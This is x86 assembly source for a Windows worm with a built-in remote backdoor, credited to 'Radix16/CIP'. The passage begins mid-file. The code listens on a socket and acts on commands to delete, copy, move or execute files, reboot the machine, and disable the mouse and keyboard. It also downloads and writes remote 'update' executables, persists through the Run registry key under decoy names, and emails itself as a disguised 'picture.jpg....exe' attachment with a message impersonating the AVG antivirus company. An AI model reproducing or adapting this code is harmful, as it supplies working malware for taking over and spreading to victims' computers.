        pop     ebx
        pop     edi
        pop     esi

        ret
WndProc endp


Main_Dialog proc hwnd:DWORD, wmsg:DWORD, wparam:DWORD, lparam:DWORD

        push    ebx
        push    esi
        push    edi


        cmp     [wmsg],WM_LISTSOCKET
        je      socket_server
        cmp     [wmsg], WM_CLOSE
        je      Close_D
        cmp     [wmsg],WM_INITDIALOG
        je      server_init


Dialog_end:
        pop     edi
        pop     esi
        pop     ebx

        ret

server_init:
        push    offset v_gen
        push    0
        push    EM_REPLACESEL
        push    1000
        push    [hwnd]
        call    SendDlgItemMessageA

        push    0
        push    SOCK_STREAM
        push    PF_INET
        call    socket

        mov     listsock,eax

        push    FD_ACCEPT+FD_READ+FD_CLOSE
        push    WM_LISTSOCKET
        push    [hwnd]
        push    [listsock]
        call    WSAAsyncSelect

        push    16
        push    offset sin
        push    [listsock]
        call    bind

        push    2
        push    [listsock]
        call    listen

        push    offset Connectionsstr
        push    IDD_TOTUSER
        push    [hwnd]
        call    SetDlgItemTextA


        mov     eax,TRUE
        jmp     Dialog_end

socket_server:
        mov     eax,lparam
        cmp     ax,FD_ACCEPT
        jne     skip_1
        shr     eax,16

        xor     ebx,ebx
        call    CheckSocketList

        push    0
        push    0
        push    [listsock]
        call    accept

        inc     Connections
        mov     [edi],eax

        push    offset Connections
        push    offset Hex2Dec
        push    offset Connectionsstr
        call    wvsprintfA

        push    offset Connectionsstr
        push    IDD_TOTUSER
        push    [hwnd]
        call    SetDlgItemTextA

        mov     ecx,server_size
        lea     eax,server_version
        call    send_data

skip_1:
        mov     eax,lparam
        cmp     ax,FD_READ
        jne     skip_15

        mov     eax,wparam
        xor     ebx,ebx
        mov     bx,ax

        mov     temp,ebx

        push    0
        push    16000
        push    offset Read_Buffer
        push    ebx
        call    recv

        cmp     eax,-1
        je      skip_15

        call    cmd_s
tsrt:
        lea     edi,Read_Buffer
        lea     esi,Read_Buffer

        mov     ecx,eax
XorLoop:
;        xor     byte ptr [edi],19
;        inc     edi
;        loop    XorLoop

        mov     LengthOfString,eax
        lea     edi,sockdes

        mov     ebx,temp

SendMore:
        cmp     dword ptr [edi],ebx
        jne     PerhapsSend
        add     edi,4
        jmp     SendMore


PerhapsSend:

        cmp     dword ptr [edi],0
        je      Senteverything

        push    0
        push    LengthOfString
        push    offset Read_Buffer
        push    dword ptr [edi]
        call    send

        add     edi,4
        jmp     SendMore

Senteverything:

        xor     al,al
        mov     ecx,256
        lea     edi,Read_Buffer
        rep     stosb

skip_15:
        cmp     ax,FD_CLOSE
        jne     skip_2

        mov     eax,wparam
        xor     ebx,ebx
        mov     bx,ax

        call    CheckSocketList

        mov     dword ptr [edi],0
        push    ebx
        call    closesocket

        dec     Connections

        push    offset Connections
        push    offset Hex2Dec
        push    offset Connectionsstr
        call    wvsprintfA

        push    offset Connectionsstr
        push    IDD_TOTUSER
        push    [hwnd]
        call    SetDlgItemTextA

skip_2: mov     eax,TRUE
        jmp     Dialog_end


Close_D:
        push    [listsock]
        call    closesocket

        call    WSACleanup

        push    L 0
        push    [hwnd]
        call    EndDialog

        mov     eax,TRUE
        jmp     Dialog_end

Main_Dialog endp

CheckSocketList:
        lea     edi,sockdes-4
CheckMoreSocket:
        add     edi,4
        cmp     [edi],ebx
        jne     CheckMoreSocket
        ret

cmd_s:  pusha
        lea     edi,Read_Buffer

        cmp     [edi],'421!'
        je      OpenCDROM

        cmp     [edi],'521!'
        je      CloseCDROM

        cmp     [edi],'621!'
        je      MessageBox

        cmp     [edi],'511!'
        je      Reboot

        cmp     [edi],'011!'
        je      PowerOFF

        cmp     [edi],'221!'
        je      Download

        cmp     [edi],'311!'
        je      Delete_File

        cmp     [edi],'911!'
        je      ExecuteFile

        cmp     [edi],'121!'
        je      Copy_File

        cmp     [edi],'021!'
        je      Move_File

        cmp     [edi],'901!'
        je      Dis_mouse

        cmp     [edi],'811!'
        je      Dis_keyboard

        cmp     [edi],'211!'
        je      CloseWin

        cmp     [edi],'321!'
        je      upload_file

        cmp     [edi],'315!'
        je      update_worm

        popa
        ret

Grifin_server:
        ret



;************************************************************************************************
; BackDoor - OPEN CD
;************************************************************************************************


OpenCDROM:
        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    offset CDopen
        call    mciSendStringA
        popa
        ret

;************************************************************************************************
; BackDoor - CLOSE CD
;************************************************************************************************

CloseCDROM:
        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    offset CDclose
        call    mciSendStringA
        popa
        ret

;************************************************************************************************
; BackDoor - MESSAGEBOX
;************************************************************************************************

MessageBox:
        mov     ecx,256
        add     edi,4

        push    edi

message_cut:

        cmp     byte ptr [edi],','
        je      C_message
        inc     edi
        loop    message_cut

C_message:

        mov     byte ptr [edi],0
        inc     edi
        mov     edx,edi

        pop     edi

        push    NULL
        push    edi
        push    edx
        push    NULL
        call    MessageBoxA
        popa
        ret

;************************************************************************************************
; BackDoor - REBOOT
;************************************************************************************************


Reboot:
        push    NULL
        push    EWX_REBOOT
        call    ExitWindowsEx
        popa
        ret

;************************************************************************************************
; BackDoor - POWEROFF for ATX
;************************************************************************************************


PowerOFF:
        push    NULL
        push    EWX_POWEROFF
        call    ExitWindowsEx
        popa
        ret

;************************************************************************************************
; BackDoor - DOWNLOAD FILE
;************************************************************************************************

Download:
        popa

        ret

        mov     ecx,256
        add     edi,4

        push    edi

file_to_down:

        cmp     byte ptr [edi],','
        je      download_now
        inc     edi
        loop    file_to_down

download_now:
        mov     byte ptr [edi],0
        inc     edi
        mov     edx,edi
        call    create_file_code
        pop     edi
        call    open_file_to_read


;        push    NULL
;        push    [fhandle]
;        call    GetFileSize

;        xchg    eax,ecx
;        jecxz   u_v_f


create_file_code:
        xor     ebx,ebx

        push    ebx
        push    FILE_ATTRIBUTE_NORMAL
        push    CREATE_ALWAYS
        push    ebx
        push    ebx
        push    GENERIC_WRITE
        push    edx
        call    CreateFileA

        mov     [Output_Handle],eax

        ret

open_file_to_read:
        xor     ebx,ebx

        push    ebx
        push    FILE_ATTRIBUTE_NORMAL
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    GENERIC_READ
        push    edi
        call    CreateFileA

        mov     [fhandle],eax

        ret


;************************************************************************************************
; BackDoor - EXECUTE FILE
;************************************************************************************************

ExecuteFile:
        add     edi,4

        push    SW_SHOWNORMAL
        push    NULL
        push    NULL
        push    edi
        push    NULL
        push    NULL
        call    ShellExecuteA
        popa
        ret

;************************************************************************************************
; BackDoor - CLOSE WINDOW
;************************************************************************************************


CloseWin:
        call    GetForegroundWindow

        push    NULL
        push    NULL
        push    WM_CLOSE
        push    eax
        call    SendMessageA
        popa
        ret

;************************************************************************************************
; BackDoor - DELETE FILE
;************************************************************************************************


Delete_File:
        add     edi,4

        push    edi
        call    DeleteFileA
        popa
        ret

;************************************************************************************************
; BackDoor - COPY FILE
;************************************************************************************************


Copy_File:
        mov     ecx,256
        add     edi,4

        push    edi

copy_cut:

        cmp     byte ptr [edi],','
        je      Copy_f
        inc     edi
        loop    copy_cut

Copy_f:

        mov     byte ptr [edi],0
        inc     edi
        mov     edx,edi

        pop     edi

        push    FALSE
        push    edx
        push    edi
        call    CopyFileA
        popa
        ret


;************************************************************************************************
; BackDoor - MOVE FILE
;************************************************************************************************


Move_File:
        mov     ecx,256
        add     edi,4

        push    edi

move_cut:

        cmp     byte ptr [edi],','
        je      move_f
        inc     edi
        loop    move_cut

move_f:

        mov     byte ptr [edi],0
        inc     edi
        mov     edx,edi

        pop     edi

        push    edx
        push    edi
        call    MoveFileA
        popa
        ret

;************************************************************************************************
; BackDoor - UPLOAD FILE
;************************************************************************************************

upload_file:
        popa
        ret


        mov     ecx,255
        add     edi,4
        xor     ebx,ebx
        push    edi

upload_cut:

        cmp     byte ptr [edi],','
        je      upload_f
        inc     edi
        inc     ebx
        loop    upload_cut

upload_f:
        mov     ecx,16000
        sub     ecx,4
        sub     ecx,ebx

        dec     ecx

        mov     [upload_size],ecx

        mov     byte ptr [edi],0
        inc     edi
        mov     esi,edi

        pop     edi
        mov     edx,edi
        call    create_file_code

        mov     ecx, [upload_size]

        push    0
        push    offset IO_Bytes_Count
        push    ecx
        push    esi
        push    [Output_Handle]
        call    WriteFile

        push    dword ptr [Output_Handle]
        call    CloseHandle


;************************************************************************************************
; BackDoor - DISABLE MOUSE
;************************************************************************************************

Dis_mouse:
        push    SW_HIDE
        push    offset mouseoff
        call    WinExec
        popa
        ret

;************************************************************************************************
; BackDoor - DISABLE KEYBOARD
;************************************************************************************************


Dis_keyboard:
        push    SW_HIDE
        push    offset keyoff
        call    WinExec
        popa
        ret

;************************************************************************************************
; BackDoor - UPDATE WORM
;************************************************************************************************

update_worm:
    pushfd
   push    edi

        xor     al,al
        mov     ecx,256
        lea     edi,cmd_1
        rep     stosb

        pop     edi

        push    offset cmd_1
        push    101
        push    [hwnd]
        call    SetDlgItemTextA

        add     edi,4
        mov     edx, offset __000
        mov     esi, offset __111
        call    _reg_key
        sub     edi,4
        mov     eax,edi
        add     eax,4

        push    eax
        push    0
        push    EM_REPLACESEL
        push    101
        push    [hwnd]
        call    SendDlgItemMessageA
update_w:
        @pushsz 'WinINET.dll'
        call    LoadLibraryA

        xchg    eax,esi

        @pushsz 'InternetGetConnectedState'
        push    esi
        call    GetProcAddress

        push    NULL
        call    $+9
        dd      00000000h
        call    eax

        or      eax,eax
        je      exit_update

        xor     eax,eax

        push    eax
        push    eax
        push    CREATE_ALWAYS
        push    eax
        push    FILE_SHARE_READ
        push    GENERIC_WRITE
        @pushsz 'C:\d5s6g7xa.exe'
        call    CreateFileA

        mov     [fhandle],eax

        @pushsz 'InternetOpenA'
        push    esi
        call    GetProcAddress

        xor     ebx,ebx

        push    ebx
        push    ebx
        push    ebx
        push    ebx
        @pushsz "GrifinUPDATE"
        call    eax

        test    eax,eax
        je      File_h_close

        mov     dword ptr [ihandle],eax
 

        @pushsz 'InternetOpenUrlA'
        push    esi
        call    GetProcAddress

        xor     ebx,ebx

        add     edi,4

        push    ebx
        push    ebx
        push    ebx
        push    ebx
        push    edi
        push    dword ptr [ihandle]
        call    eax

        xchg    eax,ebp

        test    ebp,ebp
        je      Inet_close

        @pushsz 'InternetReadFile'
        push    esi
        call    GetProcAddress

        push    NULL
        push    offset tmp
        push    16000
        push    offset Read_Buffer
        push    ebp
        call    eax

        xchg    eax,edi

      popfd 

        push    0
        push    offset IO_Bytes_Count
        push    16000
        push    offset Read_Buffer
        push    [fhandle]
        call    WriteFile

Inet_close:

        @pushsz 'InternetCloseHandle'
        push    esi
        call    GetProcAddress

        xchg    eax,ebx

        push    dword ptr [ihandle]
        call    ebx

File_h_close:

        push    dword ptr [fhandle]
        call    CloseHandle

exit_update:
    popfd
        popa
        ret

;*****************************************************************************************
; Send Data
;*****************************************************************************************

send_data:
        push    0
        push    ecx
        push    eax
        push    dword ptr [edi]
        call    send
        ret

;************************************************************************************************
; CRC32
;************************************************************************************************


CRC32:  cld
        push   ebx
        mov    ecx,-1
        mov    edx,ecx

NextByteCRC:
        xor    eax,eax
        xor    ebx,ebx
        lodsb
        xor    al,cl
        mov    cl,ch
        mov    ch,dl
        mov    dl,dh
        mov    dh,8

NextBitCRC:
        shr    bx,1
        rcr    ax,1
        jnc    NoCRC
        xor    ax,08320h
        xor    bx,0edb8h

NoCRC:  dec    dh
        jnz    NextBitCRC
        xor    ecx,eax
        xor    edx,ebx
        dec    di
        jnz    NextByteCRC
        not    edx
        not    ecx
        pop    ebx
        mov    eax,edx
        rol    eax,16
        mov    ax,cx
        ret

;*****************************************************************************
; Create EML file
;*****************************************************************************

Create_EML_file:
        xor     eax,eax

        push    eax
        push    eax
        push    CREATE_ALWAYS
        push    eax
        push    FILE_SHARE_READ
        push    GENERIC_WRITE
        @pushsz 'C:\grifin.eml'
        call    CreateFileA

        mov     [fhandle],eax

        push    0
        push    offset IO_Bytes_Count
        push    sizeMIME
        push    offset MIME
        push    [fhandle]
        call    WriteFile

        call    encodeBase64

        push    0
        push    offset IO_Bytes_Count
        push    76*200
        push    offset Read_Buffer
        push    [fhandle]
        call    WriteFile

        push    0
        push    offset IO_Bytes_Count
        push    end_MIME
        push    offset end_MIME_S
        push    [fhandle]
        call    WriteFile

        push    dword ptr [fhandle]
        call    CloseHandle

        ret

;************************************************************************************************
; MIME  base64 encode file
;************************************************************************************************
; input : esi > address to encode
;         edi > put encode data
;         ecx > size
;

encodeBase64:
        mov     edi, offset Read_Buffer
        mov     mem, 6000

        call    read_wpath

        xor     eax,eax

        push    eax
        push    FILE_ATTRIBUTE_NORMAL
        push    OPEN_EXISTING
        push    eax
        push    FILE_SHARE_READ
        push    GENERIC_READ
        push    offset k_data
        call    CreateFileA


        inc     eax
        je      __kurwa_drat
        dec     eax

        xchg    eax,edx

        ;mov     dword ptr [fhandle],eax

        xor     eax,eax
        push    eax
        push    dword ptr [mem]
        push    eax
        push    PAGE_READONLY
        push    eax
        push    edx
        call    CreateFileMappingA

        or      eax,eax
        jz      __closeha

        mov     dword ptr [maphandle],eax

        xor     ebx,ebx

        push    dword ptr [mem]
        push    ebx
        push    ebx
        push    FILE_MAP_READ
        push    eax
        call    MapViewOfFile

        or      eax,eax
        jz      __closeh

        mov     dword ptr [mapaddress],eax

        xchg    eax,esi

        xor     ecx,ecx

        mov     ecx, 100

_base64:push    ecx

        mov     ecx, (76/4)

base64_:push    ecx
        lodsb
        shl     eax,8
        lodsb
        shl     eax,8
        lodsb
        shl     eax,8

        mov     ebx, offset base64_et
        mov     cl,4

encode_paket:
        shr     eax,2
        rol     eax,8
        xlat
        stosb
        loop    encode_paket

        pop     ecx

        loop    base64_

        mov     word ptr [edi],0a0dh

        add     edi,2

        pop     ecx
        loop    _base64

__unmap:push    dword ptr [mapaddress]
        call    UnmapViewOfFile

__closeh:
        push    dword ptr [maphandle]
        call    CloseHandle
__closeha:
        push    edx
        call    CloseHandle

__kurwa_drat:
        ret

        worm_name       db      '[GRIFIN] by Radix16/CIP',0

        v_gen           db      '00000001',0


        runkey          db      'SOFTWARE\Microsoft\Windows\'
                        db      'CurrentVersion\Run',0

        mode_1:         db      'BrowserWebCheck',0
                        db      'CTFMON.EXE',0
                        db      'NeroCheck',0
                        db      'WinampAgent',0
                        db      'TaskMonitor',0

                        db      0FFh

        TempWIN9X       db      'SOFTWARE\Microsoft\Windows\CurrentVersion\'
                        db      'Internet Settings\Cache\Paths',0

        TempDirectory   db      'Directory',0

        klavesnicaEN: ; :)
                        db      'qwertyuiopasdfghjklzxcvbnm'

        kolik_pismenek  equ     $ - klavesnicaEN

        ran_name        db      '\00000000.exe',0

        new_name_size   equ     $ - ran_name

        regvalue        db      'grifin',0

; MAPI data for send email

        subject         db      'AVG',0

        date            db      '21/9/2001',0

        namefrom        db      'AVG',0

        mailfrom        db      'grisoft@grisoft.cz',0

        nameto          db      'AVG',0

        textmail        db      'Dobry den, byli jsme donuceni vypustit',0dh,0ah
                        db      'uniniversalni antivir, ktery vam odstrani',0dh,0ah
                        db      'nebezpecneho worma z vaseho PC.',0dh,0ah
                        db      0dh,0ah,'S pozdravem vase AVG',0dh,0ah
                        db      'grisoft@grisoft.cz',0dh,0ah,0dh,0ah
                        db      '!!!New internet worm in-the-wild, download'
                        db      0dh,0ah
                        db      'new universal antivir!!!',0

        sztitle         db      'Grifin Control Panel - 1.0',0
        dlg_start       db      'server_dlg1',0


        server_version  db      'WeLcOmE to GRS....',13,10
                        db      '(GRIFIN remote server) by [RaDiX16/CIP] - version '
        ver_            db      '0.9 beta :)',13,10
        client          db      'client download : radix16.cjb.net',13,10
        server_size     equ     $ - server_version


        base64_et:      db      'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
                        db      'abcdefghijklmnopqrstuvwxyz'
                        db      '0123456789+/'

        MIME:

                        db      'Subject: Picture',0dh,0ah
                        db      'MIME-Version: 1.0',0dh,0ah
                        db      'Content-Type: multipart/mixed;',0dh,0ah
                        db      '              boundary="_boundary1_"',0dh,0ah
                        db      'X-Priority: 1 (Highest)',0dh,0ah
                        db      'Importance: High',0dh,0ah
                        db      'X-Unsent: 1',0dh,0ah,0dh,0ah
                        db      '--_boundary1_',0dh,0ah
                        db      'Content-Type: text/plain;',0dh,0ah
                        db      '              charset="iso-8859-2"',0dh,0ah
                        db      'Content-Transfer-Encoding: 7bit',0dh,0ah
                        db      0dh,0ah
                        db      0dh,0ah
                        db      0dh,0ah
                        db      'Not support > UPDATE',0dh,0ah
                        db      '--_boundary1_',0dh,0ah
                        db      'Content-Type: application; name="picture.jpg'
                        db      180 dup (20h)
                        db      '.exe"',0dh,0ah
                        db      'Content-Transfer-Encoding: base64',0dh,0ah
                        db      'Content-Disposition: attachment;',0dh,0ah
                        db      '                     filename="picture.jpg'
                        db      180 dup (20h)
                        db      '.exe"',0dh,0ah
                        db      0dh,0ah
        sizeMIME        equ     $ - MIME
end_MIME_S:
                        db      0dh,0ah
                        db      0dh,0ah
                        db      0dh,0ah
                        db      '--_boundary1_'
        end_MIME        equ     $ - end_MIME_S

        classname       db      'classshit',0

        CDopen          db      'set CDAudio door open',0

        CDclose         db      'set CDAudio door closed',0

        keyoff          db      'rundll32.exe keyboard,disable',0

        mouseoff        db      'rundll32.exe mouse,disable',0

      nop
      nop
      first_encryot_code dd  0
      nop   


end start
